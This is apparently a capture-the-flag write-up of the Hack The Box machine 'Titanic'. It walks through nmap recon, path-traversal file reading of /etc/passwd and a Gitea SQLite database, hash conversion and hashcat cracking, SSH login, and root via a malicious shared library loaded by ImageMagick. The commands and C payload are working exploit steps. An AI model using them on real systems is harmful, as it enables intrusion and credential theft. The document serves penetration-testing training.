---
title: HTB - Titanic
slug: HTB-Titanic
tags: [HackTheBox, Linux, LFI, Gitea, ImageMagick]
---
![HTB - Titanic](https://c4.wallpaperflare.com/wallpaper/164/389/137/titanic-movies-love-couple-wallpaper-preview.jpg)

## Overview

| Name        | Titanic   |
| ----------- | --------- |
| OS          | Linux     |
| Base Points | Easy [30] |
| Status      | Done      |

## Recon

### Nmap

```bash
❯ nmap -sC -sV titanic.htb             
Starting Nmap 7.95 ( https://nmap.org ) at 2025-03-14 21:59 +0545
Stats: 0:00:36 elapsed; 0 hosts completed (1 up), 1 undergoing Connect Scan
Connect Scan Timing: About 70.13% done; ETC: 22:00 (0:00:15 remaining)
Nmap scan report for titanic.htb (10.10.11.55)
Host is up (0.33s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.10 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 73:03:9c:76:eb:04:f1:fe:c9:e9:80:44:9c:7f:13:46 (ECDSA)
|_  256 d5:bd:1d:5e:9a:86:1c:eb:88:63:4d:5f:88:4b:7e:04 (ED25519)
80/tcp open  http    Apache httpd 2.4.52
|_http-title: Titanic - Book Your Ship Trip
| http-server-header: 
|   Apache/2.4.52 (Ubuntu)
|_  Werkzeug/3.0.3 Python/3.10.12
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.45 seconds
```

 Visiting `http://titanic.htb/` displays a simple website. One interesting endpoint is `/book`, which returns a JSON file to download after filling out a form. Intercepting this request with Burp reveals a redirection to `/download?ticket=rand-id.json`.
## Enumeration & Exploitation 
### Local File Inclusion (LFI)

 Testing for LFI by replacing `rand-id.json` with `../../../../etc/passwd` successfully returns the contents of `/etc/passwd`. This confirms that the site is vulnerable to LFI.

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-network:x:101:102:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:102:103:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:103:104::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:104:105:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
pollinate:x:105:1::/var/cache/pollinate:/bin/false
sshd:x:106:65534::/run/sshd:/usr/sbin/nologin
syslog:x:107:113::/home/syslog:/usr/sbin/nologin
uuidd:x:108:114::/run/uuidd:/usr/sbin/nologin
tcpdump:x:109:115::/nonexistent:/usr/sbin/nologin
tss:x:110:116:TPM software stack,,,:/var/lib/tpm:/bin/false
landscape:x:111:117::/var/lib/landscape:/usr/sbin/nologin
fwupd-refresh:x:112:118:fwupd-refresh user,,,:/run/systemd:/usr/sbin/nologin
usbmux:x:113:46:usbmux daemon,,,:/var/lib/usbmux:/usr/sbin/nologin
developer:x:1000:1000:developer:/home/developer:/bin/bash
lxd:x:999:100::/var/snap/lxd/common/lxd:/bin/false
dnsmasq:x:114:65534:dnsmasq,,,:/var/lib/misc:/usr/sbin/nologin
_laurel:x:998:998::/var/log/laurel:/bin/false
```
### Subdomain Found

 If we visit `/etc/hosts`  using LFI we get this:

```
127.0.0.1 localhost titanic.htb dev.titanic.htb
127.0.1.1 titanic
```

 We can see `dev.titanic.htb` subdomain so Let's add it in our Attack Machine `/etc/hosts`
 From `/etc/passwd`, we see a `developer` user, but grabbing their SSH key directly fails. We also extract `/etc/hosts` to check for additional domains. We find:
### Visiting the Subdomain

 Visiting `http://dev.titanic.htb` on our Attack Machine opens a Gitea login page. You can register a new user to explore. In Gitea, there are two repositories of interest:

```
docker-config
flask-app
```

 Reviewing **flask-app** confirms the code flaw that led to LFI, but no additional credentials.  
 Reviewing **docker-config** reveals Gitea is running in a Docker container and stores data in `/home/developer/gitea/data`.
### Extracting Gitea Database

 By referencing Gitea’s documentation, we learn that all user data is stored in a `gitea.db` SQLite file, and the file is in turn stored in `/data/gitea` inside the docker image. The final path is:
   
   - `/home/developer/gitea/data/gitea/gitea.db`

Then using the LFI exploit, we can save this file locally: 

```bash
❯ curl -s "http://titanic.htb/download?ticket=/home/developer/gitea/data/gitea/gitea.db" -o gitea.db
```
### Gitea Database Enumeration

Open `gitea.db` in SQLite:

```bash
sqlite3 gitea.db  
sqlite> .tables  
sqlite> SELECT lower_name, passwd, salt FROM user;
```

```bash
administrator|cba20ccf927d3ad0567b68161732d3fbca098ce886bbc923b4062a3960d459c08d2dfc063b2406ac9207c980c47c5d017136|2d149e5fbd1b20cf31db3e3c6a28fc9b developer|e531d398946137baea70ed6a680a54385ecff131309c0bd8f225f284406b7cbc8efc5dbef30bf1682619263444ea594cfb56|8bf3e3452b78544f8bee9400d6936d34 test|6f4dd1c617813da3dcc9ee0c7b0aeb7b3135cc85943e92a0e54102486cff31414ded2eaeac5312914a4f333ae1f2e2d43110|3f68d4b0d5183c5d6d811d55a367dd63
```

This hash format aint good to be cracked by `hashcat`.

Retreiving Hash And Cracking the Developer’s Password, We convert it manually or use [gitea2hashcat.py](https://github.com/unix-ninja/hashcat/blob/master/tools/gitea2hashcat.py) script. And also watch this **Ippsec** video for more [Detail](https://www.youtube.com/watch?v=aG_N2ZiCfxk&t=2419s).


```bash
❯ python3 gitea2hashcat.py -h gitea.db
usage: gitea2hashcat.py [-h] [hashes ...]

Convert Gitea SALT+HASH strings to a hashcat-compatible format.

positional arguments:
  hashes      SALT+HASH strings to convert

options:
  -h, --help  show this help message and exit

Example:
    gitea2hashcat.py <salt1>:<hash1> <hash2>|<salt2> ... or pipe input from stdin.
        
    You can also dump output straight from sqlite into this script:
        sqlite3 gitea.db 'select salt,passwd from user;' | gitea2hashcat.py

❯ sqlite3 gitea.db 'select salt,passwd from user;' | python3 gitea2hashcat.py
[+] Run the output hashes through hashcat mode 10900 (PBKDF2-HMAC-SHA256)

sha256:50000:LRSeX70bIM8x2z48aij8mw==:y6IMz5J9OtBWe2gWFzLT+8oJjOiGu8kjtAYqOWDUWcCNLfwGOyQGrJIHyYDEfF0BcTY=
sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
sha256:50000:P2jUsNUYPF1tgR1Vo2fdYw==:b03RxheBPaPcye4MewrrezE1zIWUPpKg5UECSGz/MUFN7S6urFMSkUpPMzrh8uLUMRA=
```

 We know `second` one is of developer so we also add username to match in format.

```bash
# Hashes
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=
```

 Highly recommended to watch `Ippsec` video for more detail.

### Hashcat

```bash
❯ hashcat --username hashes rockyou.txt
```

After running `hashcat` we get password `25282528`

```bash
developer:sha256:50000:i/PjRSt4VE+L7pQA1pNtNA==:5THTmJRhN7rqcO1qaApUOF7P8TEwnAvY8iXyhEBrfLyO/F2+8wvxaCYZJjRE6llM+1Y=:25282528
```

Now we can just connect to Developer SSH using credentials we have.
### Into Developer's SSH

```bash
❯ ssh developer@titanic.htb
developer@titanic.htbs password: 
<SNIP>
Last login: Fri Mar 14 20:21:30 2025 from 10.10.14.143
developer@titanic:~$ ls
gitea  libxcb.so.1  mysql  user.txt
developer@titanic:~$ cat user.txt
56265a5ca4b123f4386de36c3de53d60      
```
## Privilege Escalation
### Enumerating Again

After logging in, **/opt/scripts** See a script next

```bash
developer@titanic:/opt$ ls
app  containerd  scripts
developer@titanic:/opt$ cd scripts
developer@titanic:/opt/scripts$ ls
identify_images.sh
developer@titanic:/opt/scripts$ cat identify_images.sh
cd /opt/app/static/assets/images
truncate -s 0 metadata.log
find /opt/app/static/assets/images/ -type f -name "*.jpg" | xargs /usr/bin/magick identify >> metadata.log
```

 Exploring `/opt`, we find a `scripts` folder containing `identify_images.sh`. Inspecting the file, we see it calls ImageMagick’s `identify` command on uploaded images.
 
  The system uses **ImageMagick 7.1.1–35**, which is vulnerable to a known arbitrary code execution exploit. By crafting a malicious file (e.g., an `.mvg` or `.svg`), we can execute commands when `identify` processes it.

```bash
developer@titanic:/opt/scripts$ magick --version
Version: ImageMagick 7.1.1-35 Q16-HDRI x86_64 1bfce2a62:20240713 https://imagemagick.org
Copyright: (C) 1999 ImageMagick Studio LLC
License: https://imagemagick.org/script/license.php
Features: Cipher DPC HDRI OpenMP(4.5) 
Delegates (built-in): bzlib djvu fontconfig freetype heic jbig jng jp2 jpeg lcms lqr lzma openexr png raqm tiff webp x xml zlib
Compiler: gcc (9.4)
```

**References**: [ImageMagick Vulnerability](https://github.com/ImageMagick/ImageMagick/security/advisories/GHSA-8rxc-922v-phg8) - Read this for Information.
### Arbitrary Code Execution in `AppImage` version `ImageMagick`

 According to **identify_image.sh**,  We Need to be at **/opt/app/static/assets/images** , We use Medium generation **libxcb.so.1** To cause **root** Under permission **magick** Read to **root.txt**.
 
Below is a simplified example using a shared library approach, though a reverse shell payload is often used in practice. Compile a malicious `.so` file:

```bash
cd /opt/app/static/assets/images
```

```c
gcc -x c -shared -fPIC -o ./libxcb.so.1 - << EOF
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
 
__attribute__((constructor)) void init(){
    system("cat /root/root.txt > /tmp/rootflag");
    exit(0);
}
EOF
```

 Then modify the original catalog content, such as copying a picture, we need to do this in order for `magick` to run and get changes.

```bash
developer@titanic:/opt/app/static/assets/images$ cp home.jpg home2.jpg
developer@titanic:/opt/app/static/assets/images$ ls /tmp
<SNIP>
rootflag
<SNIP>
developer@titanic:/opt/app/static/assets/images$ cat /tmp/rootflag
d3878447d77eafe9926edc3cd3f369dc
```
# Pwn3d!

![what](/img/what.png)

---

